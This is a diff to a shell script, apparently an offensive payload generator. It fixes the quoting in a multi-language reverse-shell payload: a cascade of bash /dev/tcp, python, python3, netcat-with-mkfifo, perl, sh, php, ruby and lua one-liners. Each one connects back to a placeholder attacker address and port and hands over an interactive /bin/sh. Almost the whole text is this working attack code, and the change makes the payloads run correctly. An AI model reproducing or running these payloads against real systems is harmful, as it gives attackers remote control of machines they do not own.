@@ -21,38 +21,38 @@ function print_banner(){
 	printf "\n"
 }
 
-cmd=':
+cmd='
 if command -v bash >/dev/null 2>&1; then
 	/bin/bash -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
 	exit;
 elif command -v python >/dev/null 2>&1; then
-	python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"IP_REPLACE\",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+	python -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
 	exit;
 elif command -v python3 >/dev/null 2>&1; then
-	python3 -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"IP_REPLACE\",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+	python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("IP_REPLACE",PORT_REPLACE)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'\''
 	exit;
 elif command -v nc >/dev/null 2>&1; then
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_REPLACE PORT_REPLACE >/tmp/f
 	exit;
 elif command -v perl >/dev/null 2>&1; then
-	perl -e "use Socket;$i="IP_REPLACE";$p=PORT_REPLACE;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};""
+	perl -e '\''use Socket;$i="IP_REPLACE";$p=PORT_REPLACE;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\''
 	exit;
 elif command -v sh >/dev/null 2>&1; then
 	/bin/sh -i >& /dev/tcp/IP_REPLACE/PORT_REPLACE 0>&1
 	exit;
 elif command -v php >/dev/null 2>&1; then
-	php -r "$sock=fsockopen(\"IP_REPLACE\",PORT_REPLACE);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+	php -r '\''$sock=fsockopen("IP_REPLACE",PORT_REPLACE);exec("/bin/sh -i <&3 >&3 2>&3");'\''
 	exit;
 elif command -v ruby >/dev/null 2>&1; then
-	ruby -rsocket -e "f=TCPSocket.open("IP_REPLACE",PORT_REPLACE).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"
+	ruby -rsocket -e '\''f=TCPSocket.open("IP_REPLACE",PORT_REPLACE).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'\''
 	exit;
 elif command -v lua >/dev/null 2>&1; then
-	lua -e \"require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"IP_REPLACE\",\"PORT_REPLACE\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\");"
+	lua -e '\''require("socket");require("os");t=socket.tcp();t:connect("IP_REPLACE","PORT_REPLACE");os.execute("/bin/sh -i <&3 >&3 2>&3");'\''
 	exit;
 else
 	echo "No programs installed!" > /dev/tcp/IP_REPLACE/PORT_REPLACE
 fi
-:'
+'
 
 print_banner
 
